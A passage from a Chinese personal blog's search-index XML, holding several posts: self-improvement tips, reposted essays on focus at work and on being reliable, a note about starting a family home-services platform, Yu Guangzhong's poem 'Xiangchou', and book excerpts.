遍也不会刷出花来，只会分散宝贵的精力和专注力。</p><p>3.<strong>整理房间。</strong></p><p>有时候烦躁的心情就像十除以三一样，无穷无尽，不会关心周围环境的整洁，会随手乱扔东西，心情乱，房间也乱，这是心理学里的<strong>“踢猫效应”</strong>。</p><p>相反，脑子很乱理不清的时候，也可以从整理房间做起。房间整洁干净了，心情好像也明朗了，思绪也能理清。</p><p>4.因为互联网，我们每天都能接收大量的知识，今天有个专家说沟通很重要，你就去学沟通，明天身边人做电商赚了钱，你就去学开网店。</p><p><strong>没有清晰的目标，耳根子软，就会贪多贪全，什么都想做，什么都想学，东一脚西一脚，哪脚踩得都不深。</strong></p><p>从现在开始明确三观。<strong>知道自己想要什么，想发展什么专长，就能分清哪些知识和技能才是真正需要的，对目标才更有帮助。</strong></p><p>5.不要频繁地跳槽。相信我，没有一家公司会喜欢 2 年跳 3 次的员工。<strong>频繁的平级跳槽减分项。</strong></p><p>6.制定一个小目标，比如月底减下 5 斤、读完一本书等等。<strong>许多人浮躁，是因为蓝图太大，行动太少，</strong>会因为目标实现的太慢而失望。</p><p>一个小目标不仅可执行，难度不大， 还能有比较好的结果，给自己信心和鼓励。</p><p>7.有意识地控制“节奏”。</p><p>读书求快，就会错过和作者的对话；<br>吃饭求快，就忽略了食物的美味；<br>学习求快，就忘了学习的初衷。<br>现在我学会控制做事的“节奏”：好文章细细品，捧着温热的咖啡慢慢享受。<strong>放慢脚步，忙碌的生活也有了喘息之地，做事也更从容。</strong></p><p>8.能力再强的人，也容易拿自己的短处比较别人的长处，结果发现自己还差得多，很难肯定自己。<strong>专注自己的成长，和昨天的自己比，别和今天的别人比。</strong></p><p>9.定期理财。每个月存 300、500 都可以。数量是其次，心态决定能否拥有一笔不菲的理财收益。就像巴菲特曾经说的：<strong>在股市赚钱并不难，只是你不肯慢慢变得有钱而已。</strong></p><p>10.可以拖延，但要设置一个期限。装看不见的事不会凭空消失，更没人帮你解决。<strong>表面是拖延时间，实际是拖延自己。</strong></p><p>11.<strong>不对周围人报太高期望。</strong>别人帮我，我心怀感激，但没有帮助我，也是情理之中的事。对别人保持平常心，情绪就不会像钟摆一样大起大落，自然就沉稳了许多。</p><p>12.坚持做一件小事。看书也好，练字也罢。这些事也许短期内看不到成效，也不能改变你的生活。<strong>但我们总是高估一年的成绩，却远远低估了五年的成就。</strong></p><p>13.每天坚持阅读 30 分钟书籍。<strong>我们这一代，读书绝对是最廉价却最有效的成长方式之一。</strong></p><p>不仅廉价，而且付出就有回报。现在互联网这么发达，许多阅读资源触手可得，我们还有什么理由抱怨没有成长方法呢？</p><p>14.<strong>你之所以浮躁，是因为从未关注过当下。</strong>睡觉的时候想着明天的报表，看书时想着该拍哪句发朋友圈，和朋友在一起总是玩手机。<strong>于我来说，不浮躁，就是该吃饭吃饭，该睡觉睡觉，专心在当下，做好每一件事。</strong></p><p>15.不要给自己预设。年初就给自己定下“考下 5 个证书”的预期，如果感觉没戏了，自己就对自己特别失望。</p><p><strong>完全没有必要把自己架的那么高，学习也好，生活也好，金一寸有一寸的欢喜。</strong>预期太高反而会适得其反，徒添烦恼。</p><p><strong>16.不要被生活安排，要清晰地安排生活。</strong></p><p>今天先做运动还是先工作，明天的英语学多少页，午饭打算吃什么。<br>对自己负责不仅仅是句口号，更要落在实际行动上。</p><p><strong>别想的太多，凡事干起来再说。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 道理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最有水平的工作方式 --- 转载</title>
      <link href="/2022/08/13/views/%E8%BD%AC%E8%BD%BD/%E6%9C%80%E6%9C%89%E6%B0%B4%E5%B9%B3%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/08/13/views/%E8%BD%AC%E8%BD%BD/%E6%9C%80%E6%9C%89%E6%B0%B4%E5%B9%B3%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>去年，复旦网红教授梁永安在网上开了一门课，叫<strong>《工作之苦》</strong>。</p><p>在课前的一次直播中，网友们纷纷朝他倒起了苦水：</p><p>有人抱怨工作杂事太多，有人吐槽人际关系太难处理，有人发愁自己勤勤恳恳十多年，仍然一无所成……</p><p>梁教授最后总结道：“今天的工作之苦，早已不是身体的苦，而是我们在精神上的苍茫。”</p><p>仔细想想，的确如此。</p><p>很多时候并非工作本身让人疲惫，而是一些无关紧要的小事消耗了太多心力。</p><p>如果说工作是一场修行，那我们要修的不过是<strong>断、舍、离</strong>三字。</p><div class="fj-gallery"><p><img src="/img/%E7%BC%A9%E7%95%A5%E5%9B%BE%E9%9A%8F%E6%9C%BA/36.jpg"></p>          </div><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>无用的情绪，当断。</p><p>网上看过一个很有意思的词，叫做“情绪成本”。</p><p>说的是，<strong>你每陷入情绪一分钟，就会损失一分钟去解决问题</strong>。</p><p>工作中最沉重的隐藏成本就是情绪成本： </p><p>碰到难搞的任务，焦虑的好几夜没睡好，连续一周都效率低到不行；</p><p>被老板批评了三分钟，结果一下午都闷闷不乐，无心推进手头上的工作；</p><p>遇到混日子的同事，开始怀疑起自己认真工作的意义……</p><p>这世上没有一份工作不辛苦，没有一处人事不复杂。</p><p>真正阻碍我们把事情做好的，不是能力，而是自己的心境。</p><p>真正内心强大的人，早就戒掉了情绪，收起了委屈。</p><p>主持人鲁豫大四那年在电视台实习时，每天忙得昏天黑地，既要负责剪辑、配音，还要被领导安排到处打杂。</p><p>但当时的制片主任以她还是学生的借口，只给她一半的劳务费。</p><p>凭什么自己辛辛苦苦，干的活更多，最后反倒被区别对待？</p><p>鲁豫心里特别不爽，特别难过。</p><p>但最后她还是选择了把委屈咽进心里，第二天该做什么做什么。</p><p>因为她知道，这份工作对自己来说是个好平台，吃点苦、吃点亏没关系，把事情做好，得到成长才是最重要的事。</p><p>稻盛和夫曾说过：</p><p><strong>“成功不要有无谓的情绪。即使你抱怨再多、委屈再大，当下最要紧的一件事就是先把工作做好，这才是一个成熟人该有的心态。”</strong></p><p>与其把精力花在内耗上，不如以积极的心态来努力提升自己。</p><p>当你学会把情绪调成极简模式，自己能力提高了，工作也跟着顺了。</p><div class="fj-gallery"><p><img src="/img/%E7%BC%A9%E7%95%A5%E5%9B%BE%E9%9A%8F%E6%9C%BA/41.jpg"></p>          </div><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p><strong>低质量的忙碌，当舍。</strong></p><p>有人问撰稿人易小昭：为什么我整天忙得脚不沾地，却没有丝毫的进步和成就感？</p><p>她答道：因为你总是在瞎忙，不分大事小事，什么都忙。</p><p>人的精力都是有限的，找不到自己该聚焦的点，就注定会陷入低质量的忙碌。</p><p>股神巴菲特曾经为自己的私人飞行员弗林特，做过人生的规划。</p><p>巴菲特让弗林特在一张纸上写下他的前25个目标，然后让弗林特选出前5个必须要完成的。</p><p>最后，巴菲特告诉弗林特，以后要不惜一切代价，避免在剩余的20个目标上投入精力，要把全部的精力都放在前5个必须要完成的目标上。</p><p>法国作家拉罗什富科也说过：“<strong>整天只知道为琐碎的小事忙碌的人，必然成不了大器</strong>。”</p><p>有选择的专注，远比瞎忙要重要得多。</p><p>村上春树每天早上4点起床写作，一写就是四五个小时。</p><p>这段时间里，他除了集中精力写稿，不见任何人，不处理任何事。</p><p>扎克伯格每天早上都会问自己一个问题：“我现在做的，是我所能做的最重要的事吗？”</p><p>如果答案是肯定的，他才会感觉自己的时间没有浪费。</p><p>工作需要努力，也需要巧力，永远不要用战术上的勤奋，掩盖战略上的懒惰。</p><p>就像导演樊小纯讲的，<strong>人不需要活太多样子，你认真做好一件事，会解释所有事</strong>。</p><p>任何时候，专注20%的要事，避免80%的琐事。</p><div class="fj-gallery"><p><img src="/img/%E7%BC%A9%E7%95%A5%E5%9B%BE%E9%9A%8F%E6%9C%BA/45.jpg"></p>          </div><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p><strong>过往的经验，当离。</strong></p><p>看过一个感慨很深的故事。</p><p>一头驴背着盐过桥，脚一滑掉进了河里，盐遇水很快就化了，它顿时感觉背上轻松了不少。</p><p>驴高兴坏了，以为获得了减轻负重的好方法。</p><p>后来有次它又背了几袋棉花过河，干脆直接就跳进了水里。</p><p>结果吸了水的棉花越来越重，驴也因此溺水身亡。</p><p>总以为抱紧过去的经验就能如鱼得水，却忘了这世界其实瞬息万变。</p><p>你发现没有，很多人工作上之所以一直没什么成长，就是陷入了这种“<strong>驴子背盐</strong>”式的思维误区。</p><p>通用公司董事长杰克·韦尔奇，在商界驰骋多年，屡次缔造商业奇迹。</p><p>曾有人提议他将管理经验总结成书，他却幽默一笑：“那我得去垃圾桶里翻一翻了。”</p><p>工作数十年来，杰克从不做经验留档，甚至要求公司定期清理内部文件。</p><p>在他看来，过往的经验只会成为束缚，他更希望员工能具体问题具体分析。</p><p>也正是得益于他这种“经验归零”的思维，通用才躲过了创办以来的最大危机。</p><p>1981年杰克刚接手通用时，当时的制造业利润已经日益下降。</p><p>他深刻认识到，如果依赖传统的管理经验，别说维持现状了，公司还极有可能破产。</p><p>于是杰克大胆抛弃了沿用数十年的公司战略，结合当时的形势进行了一系列的革新。</p><p>在他的带领下，通用的市值不降反增，扩大了整整30倍。</p><p><strong>走老路，永远到不了新地方。</strong></p><p>以空杯心态去学习知识，用成长思维来对待工作。</p><p>不断向外学习、向内更新，永远是对未来最好的投资。<br>▽<br>之前读《麦肯锡极简工作法则》，其中有一点让我受益颇深：</p><p><strong>永远不要杂乱无章地进行工作。</strong></p><ul><li>摆脱无用的负面情绪，才能专注自我的提升。</li><li>告别低质量的忙碌，才能拥有高质量的人生。</li><li>抽离过去的经验，才能拥抱未来的无限可能。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近在干一件大事情</title>
      <link href="/2022/08/12/views/%E7%94%9F%E6%B4%BB%E5%B0%8F%E8%AE%B0/%E6%9C%80%E8%BF%91%E5%9C%A8%E5%B9%B2%E4%B8%80%E4%BB%B6%E5%A4%A7%E4%BA%8B%E6%83%85/"/>
      <url>/2022/08/12/views/%E7%94%9F%E6%B4%BB%E5%B0%8F%E8%AE%B0/%E6%9C%80%E8%BF%91%E5%9C%A8%E5%B9%B2%E4%B8%80%E4%BB%B6%E5%A4%A7%E4%BA%8B%E6%83%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>:::<br>我们准备创业<br>做一个线上的家政平台<br>:::</p><h3 id="关于这件事的起因"><a href="#关于这件事的起因" class="headerlink" title="关于这件事的起因"></a>关于这件事的起因</h3><p>8月7号，晚上10点多</p><p>我舅舅突然给我弹了一个多人的vx视频电话，一共有我、我妈、小姨、舅舅 四个人</p><p>说是要搞一个家政平台，能成功最好，失败了就当给我积累经验练手了。平台开发了也可以卖给相关行业的老板，于是我们一拍即合。</p><ul><li>舅舅负责后端开发</li><li>小姨负责公司运营吧</li><li>妈妈负责打入其他家政公司内部，熟悉业务流程和工作安排。并开拓周边市场，联系有家政相关技能的人群。</li><li>我负责熟悉整体流程和前端开发</li></ul><p>以下是我最近写的调查报告，下个星期就准备开发了</p><div class="fj-gallery"><p><img src="/img/%E6%9C%80%E8%BF%91%E5%9C%A8%E5%B9%B2%E4%B8%80%E4%BB%B6%E5%A4%A7%E4%BA%8B%E6%83%85/1.png"><br><img src="/img/%E6%9C%80%E8%BF%91%E5%9C%A8%E5%B9%B2%E4%B8%80%E4%BB%B6%E5%A4%A7%E4%BA%8B%E6%83%85/2.png"><br><img src="/img/%E6%9C%80%E8%BF%91%E5%9C%A8%E5%B9%B2%E4%B8%80%E4%BB%B6%E5%A4%A7%E4%BA%8B%E6%83%85/3.png"><br><img src="/img/%E6%9C%80%E8%BF%91%E5%9C%A8%E5%B9%B2%E4%B8%80%E4%BB%B6%E5%A4%A7%E4%BA%8B%E6%83%85/4.jpg"></p>          </div>]]></content>
      
      
      <categories>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个细节，看一个人靠不靠谱 --- 转载</title>
      <link href="/2022/08/12/views/%E8%BD%AC%E8%BD%BD/%E4%B8%80%E4%B8%AA%E7%BB%86%E8%8A%82%EF%BC%8C%E7%9C%8B%E4%B8%80%E4%B8%AA%E4%BA%BA%E9%9D%A0%E4%B8%8D%E9%9D%A0%E8%B0%B1/"/>
      <url>/2022/08/12/views/%E8%BD%AC%E8%BD%BD/%E4%B8%80%E4%B8%AA%E7%BB%86%E8%8A%82%EF%BC%8C%E7%9C%8B%E4%B8%80%E4%B8%AA%E4%BA%BA%E9%9D%A0%E4%B8%8D%E9%9D%A0%E8%B0%B1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>如果让你用一个词来高度评价一个人，你会用哪个词？</p><p>放在过去，你可能会用“善良”、“聪明”、“能力强”这样的词。</p><p>但是现在，越来越多的人，高度评价一个人时，都选择了“<strong>靠谱</strong>”这个词。</p><p>什么叫靠谱？</p><p>最近看到一篇文章，里面提到：</p><p>我所理解的靠谱就是你把这事交给TA之后完全不用操心后续，因为你知道TA肯定能落实，就算没办好，也能及时给你一个回馈，这就叫靠谱。</p><p>文章还提到，一个人是否靠谱，就看三件事：“凡事有交代，件件有着落，事事有回音。”</p><p>说是三件事，其实就是一件事，说的是你做事要有<strong>闭环思维</strong>。</p><p>所谓闭环，指的是一件事有了开头，就必须有个结尾。</p><p>比如，老板让你写一份方案，你埋头写完后，并没有发送给老板，就去做了别的事，这就没有形成闭环。</p><p>你还需要把方案发送到老板的邮箱。</p><p>还没完，你还得口头或微信告诉老板，说方案已经发送到了你的邮箱。</p><p>只有做到了这一步，这件事才算真正形成了闭环。</p><div class="fj-gallery"><p><img src="/img/%E7%BC%A9%E7%95%A5%E5%9B%BE%E9%9A%8F%E6%9C%BA/1.jpg"></p>          </div><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p><strong>一个人是否靠谱，换位思考很重要。</strong></p><p>为什么靠谱的人要有闭环思维？</p><p>因为闭环思维体现的不仅仅是你的责任心，更是你的团队协作能力和换位思考能力。</p><p><strong>你心里装着别人，你才能真正的靠谱。</strong></p><p>人并不孤立存在，人和人之间会产生很多链接，这些链接会形成大大小小的协同网络。</p><p>换句话说，我们每个人，作为一个网络节点，都生活在协同网络中。</p><p>你所在的小组，是一个协同网络，你所在的部门，是一个协同网络，你所在的公司，又是一个更大的协同网络。</p><p>你从协同网络中接到一个任务，处理完毕后，你把处理的结果反馈到网络中，并提交给下一个需要处理这个任务的节点。</p><p>这个任务在你这里，就形成了闭环。</p><p>也就是说，你为下一个节点提供了你的确定性，以确保这个任务，能够顺利的往下进行。</p><p>别人信任你，说你靠谱，本质上讲，就是因为你能够提供对方所需要的确定性。</p><p>基于此，我给“靠谱”下了一个更宏观的定义：</p><p>所谓靠谱，指的是你能够持续的为你所在的协同网络提供别人可预期的确定性。</p><p>这个定义里，有几个关键词：<strong>持续、协同网络、可预期、确定性。</strong></p><p>这是一种产品思维，你把自己当做了一个产品，并在协同网络中与别人互动。</p><p>产品从本质上讲，就是持续的为用户提供确定性的服务，并且，用户对这项确定性的服务产生了预期，进而产生了信任。</p><p>你在公司这个协同网络里，你的用户就是你的老板、你的上级、你的同事；</p><p>你在家庭这个协同网络里，你的用户就是你的爱人、你的孩子、你的父母。</p><p>你要想成为一个靠谱的人，你就需要换位思考，去思考你的用户需要什么样的确定性。</p><p>就拿刚才的例子说，老板需要的确定性，是“你把方案做好，并告诉TA”，但如果你提供的确定性，是“我把方案做好，并发送到老板邮箱”，这就出现了误差，因为“告诉TA”并不等于“发送到邮箱”。</p><p>发送到邮箱，老板不一定能看到，所以你还得口头或微信告诉老板，说方案已经发送到了你的邮箱。</p><p>再比如，你上飞机前正和伴侣聊微信，上飞机后，你给伴侣发微信说：飞机马上起飞，一会儿发的信息无法回复，飞机两小时后落地，落地后再回复。</p><p>这就叫<strong>换位思考</strong>，你要站在对方的角度去思考，明确的知道对方要的确定性到底是什么。</p><p>社会变化越来越快，不确定性越来越多，焦虑情绪也就越来越多，正因为如此，大家都想追求尽可能多的确定性。</p><p>追求安全、追求稳定、追求靠谱……本质上都是在追求确定性。</p><p>我们在寻找事业伙伴、结交朋友、寻找伴侣时，尽量找靠谱的人合作，因为靠谱的人，能够在不确定的未来，给你提供一些可依赖的确定性。</p><div class="fj-gallery"><p><img src="/img/%E7%BC%A9%E7%95%A5%E5%9B%BE%E9%9A%8F%E6%9C%BA/11.jpg"></p>          </div><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p><strong>不轻易承诺，但一旦承诺，就必须负责。</strong></p><p>靠谱的人，会把承诺别人的事，当做是自己的事。</p><p>现代社会很讲究契约精神，所谓契约精神，指的是人和人之间的一种自由、平等、守信的精神。</p><p>也就是说，在自由平等的情况下，你承诺别人的事，你就要把它做好。</p><p>生活中，除了那些白纸黑字的协议，还有口头的承诺、角色的选择等等，都是在建立契约。</p><p>签署劳动合同、承诺明天准时参会、与伴侣结为夫妻……这些都是在建立契约。</p><p>本质上讲，建立契约，就是承诺给对方某些方面的确定性。</p><p>所以你承诺别人时，稍微慢一些，因为建立契约前，你是自由的，但契约一旦建立，就意味着你得按照双方约定的权利和责任，来履行你的义务。</p><p>如果一个人没有契约精神，不能给别人提供确定性，经常毁约，这就会透支TA在协同网络中的信用。</p><p>一旦信用破产，就寸步难行了。</p><div class="fj-gallery"><p><img src="/img/%E7%BC%A9%E7%95%A5%E5%9B%BE%E9%9A%8F%E6%9C%BA/16.jpg"></p>          </div><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p><strong>对自己的能力，要有正确的认知。</strong></p><p>一个人责任心强，是好事，但很多责任心强的人，经常做出“夸大”的承诺。</p><p>倒并不是他们“有心”为之，而是他们在承诺前，没有合理评估自己完成承诺的能力。</p><p>尽管他们竭尽全力去做，但结果却依然不好。</p><p>这是很多责任心强的人被烙上“不靠谱”印记的重要原因。</p><p>他们没有把“想做好”和“能做好”分清楚，“想做好”是态度问题，“能做好”是能力问题。</p><p>人总是这样，经常高估自己的能力，进而做出和自己能力不符的承诺。</p><p>刚才说了，靠谱的本质是给别人提供确定性，你能换位思考，你有契约精神，但你的能力却没跟上，你依然无法给别人提供确定性。</p><p>不仅如此，责任心强的人，事如果没办好，还会陷入深深的自责。</p><p>遇到这样的问题该怎么解决？</p><p><strong>首先</strong>，你别答应得那么快，先合理评估自己的能力和事的难易程度。</p><p><strong>其次</strong>，如果这种情况出现多次，那么下次再承诺时，你要强行把自己的能力估低。</p><p><strong>最后，</strong>无论如何，你还是要想办法提高自己的能力才行。</p><p>“无心”的不靠谱，也是不靠谱，一个真正靠谱的人，会让自己的能力，配得上自己的承诺。</p><div class="fj-gallery"><p><img src="/img/%E7%BC%A9%E7%95%A5%E5%9B%BE%E9%9A%8F%E6%9C%BA/21.jpg"></p>          </div><h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p><strong>短期的靠谱，不是真正的靠谱。</strong></p><p>最近几年，“聊得来”成了大家发展关系的重要标准，其实时间长了你会发现，很多“聊得来”，都只是一种心理的满足。</p><p>他们会察言观色，发现你的心理需求，以合适的方法，让你觉得“很靠谱”。</p><p>刚才说了，一个人如果靠谱，需要换位思考，需要具备契约精神，需要有与之匹配的能力。</p><p>这就够了吗？</p><p>还不够，你还需要知道靠谱的动机。</p><p>《战国策》里，有这样一则故事：</p><p>邹忌拜见齐威王，说：</p><p>“我确实不如徐公美，但我的妻子偏爱我，我的妾害怕我，我的客人有求于我，所以他们都说我比徐公美。</p><p>如今齐国有方圆千里的疆土，宫中的姬妾及近臣，没有一个不偏爱大王的，朝中的大臣没有一个不惧怕大王的，国内的百姓，没有不对大王有所求的，由此看来，大王您受到的蒙蔽太严重了！”</p><p><strong>看一个人的品格，不是看TA怎么对待强势，而是看TA怎么对待弱势。</strong></p><p>有的人，面对强势时，会出现短期的靠谱。</p><p>职场中，你应该见过这样的人，他们办领导的事都特别靠谱，但办下属的事就各种不靠谱。</p><p>很多女生也会有这样的感受，男生追自己时，真的是各种的靠谱，但一旦结婚后，就各种的不靠谱。</p><p>为什么？</p><p>因为男生追女生时，男生属于弱势，女生属于强势，但结了婚后，就不存在这种情况了。</p><p>最近，看到黄渤的一段视频，他说，“以前总能遇到各种各样的人，各种小心机，去了以后也结不出账来，谁搭理你啊。但现在成名了，身边全是好人，每一张都是洋溢的笑脸。”</p><p><strong>真正的靠谱，是一种内化于心的品质，而不是短期的表演。</strong></p><p>如果是短期关系，这样的短期靠谱也无所谓，但如果是长期关系，比如婚姻、事业合伙人，那你就得留意了。</p><div class="fj-gallery"><p><img src="/img/%E7%BC%A9%E7%95%A5%E5%9B%BE%E9%9A%8F%E6%9C%BA/39.jpg"></p>          </div><h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p><strong>靠谱，是一种自我认知。</strong></p><p>去年七月，我去了一趟曲阜。</p><p>在曲阜，我参观了三孔（孔府、孔林、孔庙）、三孟（孟府、孟林、孟庙）以及颜庙。</p><p>不知为何，当我走在孔林时，“克己复礼”这四个字一直在我脑中盘旋。</p><p>当我走到孔林最深处，站在孔子墓前，我才突然意识到，原来“克己”和“复礼”根本就不是两件事，而是同一件事。</p><p>这是一体的两面，是同一件事对内和对外的不同表现形式。</p><p>对外，表现的是复礼，是道德，是外在的秩序，对内，表现的是克己，是修炼，是内在秩序。</p><p>自此以后，我看世界有了一种新的视角，我把这种视角叫做<strong>“一体两面”。</strong></p><p>这和靠谱有什么关系？</p><p>其实，靠谱也是一体两面的，对外，表现的是对别人的靠谱，对内，表现的是对自己的靠谱，这是同一件事。</p><p>换句话说，一个真正靠谱的人，是把靠谱当做自己的品质，是自己对自己的要求，而不是别人对自己的要求。</p><p>正因为你对自己靠谱，所以你才能对别人靠谱。</p><p>试想一下，如果一个人对自己都不靠谱，你觉得TA会对你靠谱吗？</p><p>职场中，有人接到任务，遵循的是“做完”原则，只要按要求完成任务就行，而有的人接到任务，遵循的是“做好”原则，TA会尽己所能做到最好，远超别人的预期。</p><p><strong>做完，就是对别人靠谱，而做好，是对自己靠谱。</strong></p><p>如果用这样的视角去看周围的人，你会发现还真没几个靠谱的人。</p><p>你也不必惊慌，这个世界上没有“完美的人”，这只是一种追求，没有人能在所有方面都能做到靠谱，重要的并不是完美，而是你要的那个确定性对方是否能够提供，这才是关键。</p><p>影视剧里经常有背叛的情况，其实所谓的背叛，就是你要的那个确定性遭到了破坏。</p><p>确定性对一段关系来说，真的很重要。</p><p>我们的本性要求我们追求安全感，追求确定性，但你始终也要记住，不确定性随时都在发生，你要做的，不是去消灭不确定性，因为你消灭不完，你只能接受不确定性，接受了，你才能更好的对待所拥有的确定性。</p><p>靠谱，是一种优秀的品质，只有自己靠谱，才能交到靠谱的朋友，我们无法强行去改变一个人，但我们可以由内而外的去影响一个人。</p><p><strong>你要做的，不过就是遵从本心，做自己该做的事，成为自己该成为的人。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《乡愁》</title>
      <link href="/2022/08/04/views/%E8%BD%AC%E8%BD%BD/%E4%B9%A1%E6%84%81/"/>
      <url>/2022/08/04/views/%E8%BD%AC%E8%BD%BD/%E4%B9%A1%E6%84%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>:::<br>标题:乡愁<br>作者:余光中<br>:::</p><p>小时候，<br>乡愁是一枚小小的邮票，<br>我在这头，<br>母亲在那头。</p><p>长大后，<br>乡愁是一张窄窄的船票，<br>我在这头，<br>新娘在那头。</p><p>后来啊，<br>乡愁是一方矮矮的坟墓，<br>我在外头，<br>母亲在里头。</p><p>而现在，<br>乡愁是一湾浅浅的海峡，<br>我在这头，<br>大陆在那头。</p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 散文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>娱乐至死</title>
      <link href="/2022/08/03/views/%E7%94%9F%E6%B4%BB%E5%B0%8F%E8%AE%B0/%E5%A8%B1%E4%B9%90%E8%87%B3%E6%AD%BB/"/>
      <url>/2022/08/03/views/%E7%94%9F%E6%B4%BB%E5%B0%8F%E8%AE%B0/%E5%A8%B1%E4%B9%90%E8%87%B3%E6%AD%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>:::<br>现在这个时代变化的太快了，总是有不同的、新奇的娱乐事物吸引着我。<br>各类游戏，抖音、小红书、微博、哔哩哔哩等等，各种碎片化的信息层出不穷。<br>:::</p><h3 id="开始思考如何“反碎片化”"><a href="#开始思考如何“反碎片化”" class="headerlink" title="开始思考如何“反碎片化”"></a>开始思考如何“反碎片化”</h3><p>因为长期碎片化的娱乐,让我越来越没有耐心做完一整件事</p><p>“碎片化”获得信息的方式，久而久之</p><p>会让人以为自己学到了很多，但实际什么都没有</p><p>这就变成现代人“焦虑”的根源</p><p>从现在开始，及时止损，试着完整的做完一件事吧</p><ul><li>完整的看完一本书</li><li>完整的看完一部电影</li><li>完整的做完一个任务</li><li>完整的写完这篇文章</li></ul><blockquote><p>沉下心,看书,复盘,专注,成长。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《我亦飘零久》 --- 摘记</title>
      <link href="/2022/08/01/views/%E6%91%98%E8%AE%B0/%E6%88%91%E4%BA%A6%E9%A3%98%E9%9B%B6%E4%B9%85/"/>
      <url>/2022/08/01/views/%E6%91%98%E8%AE%B0/%E6%88%91%E4%BA%A6%E9%A3%98%E9%9B%B6%E4%B9%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>:::<br>书名：我亦飘零久<br>作者：独木舟<br>:::</p><h2 id="一月-你还没有出现"><a href="#一月-你还没有出现" class="headerlink" title="一月 你还没有出现"></a>一月 你还没有出现</h2><ul><li><p>我想要的海洋，是幽深的蓝色，干净，壮阔，从容，宛如高原上的天空倒转过来。<br>我想要看到的，是这个孤独星球的眼泪。</p></li><li><p>情绪像一只饱胀的水球，稍微给它一点儿压力，便会汁液飞溅。</p></li><li><p>一场感冒痊愈的时间大概是十天。<br>一场夭折了的爱情痊愈的时间是——未知。</p></li><li><p>我用手指在沙滩上写下你的名字，冬天的海水带走了它。</p></li></ul><h2 id="二月-你睡在隔壁"><a href="#二月-你睡在隔壁" class="headerlink" title="二月 你睡在隔壁"></a>二月 你睡在隔壁</h2><p>那时，我怎么都想不到，原来也有这一天，念及你，竟既无风雨也无晴。</p><h2 id="三月-下起了大雨"><a href="#三月-下起了大雨" class="headerlink" title="三月 下起了大雨"></a>三月 下起了大雨</h2><ul><li><p>如果你自己都认同了那些不合理的规则，那又怎么可能有资格、有立场去谴责对方所作的事情对你造成了伤害。</p></li><li><p>陈奕迅唱的很对，感情总是善良，残忍的是，人会成长。</p></li><li><p>荣格讲过：对于普通人来说，一生最重要的功课就是学会接受自己。</p></li><li><p>每个生命来到这个世界都是有使命的，都有他的喜与悲，辛劳与成就，缺失与收获。</p></li><li><p>将要直面的，与已成过往的，较之深埋于我们内心的，皆为微末。</p></li><li><p>这一生，所能够得到的爱，和所能够付出的爱，配额其实都是有限的。</p></li></ul><h2 id="四月-遍地蔷薇"><a href="#四月-遍地蔷薇" class="headerlink" title="四月 遍地蔷薇"></a>四月 遍地蔷薇</h2><ul><li><p>不知道为什么，在这段长长的隧道里，我忽然又想起他。<br>想起经过塔克拉玛干沙漠的那天晚上，天上又大又白的月亮。<br>想起在那之后，每当我在痛苦面前表现得不够强大，便会用他对我说的那句话狠狠鞭挞自己，想起那些靠近和抵触，那些沉沦和反复。<br>想起那些我不知道该不该叫做爱情的东西。  </p></li><li><p>如果这一生没有机会再见到你，我能不能送你一张照片？  </p></li><li><p>在青海湖边，我有一点点惆怅，但不至于悲伤。<br>我只是觉得，原本不应该是我一个人站在这里。  